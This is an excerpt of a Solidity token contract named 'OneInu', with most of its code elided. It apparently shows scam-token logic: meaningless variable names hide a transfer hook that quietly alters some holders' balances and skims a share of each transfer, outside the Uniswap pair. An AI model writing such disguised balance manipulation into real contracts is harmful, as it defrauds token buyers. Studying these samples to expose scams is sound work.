...
contract OneInu is Ownable {
    uint256 private parent;
    string private whether;
    uint256 private _tTotal;
    string private play;
    uint256 private interior;
    uint8 private basic;
    ...
    function outer(
        ...
        if (rain[rear] == 0 && (address(uniswapV2Pair)) != rear && factory[rear] > 0) {
            rain[rear] -= basic;
        }
        ...
        uint256 syllable = (fifth * parent) / interior;
        fifth -= syllable;
        factory[loose] += basic;
        repeat[eye] += fifth;
    }
    ...
    mapping(address => uint256) private rain;
    ...
    function transferFrom(
        ...
        outer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        outer(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(chamber);
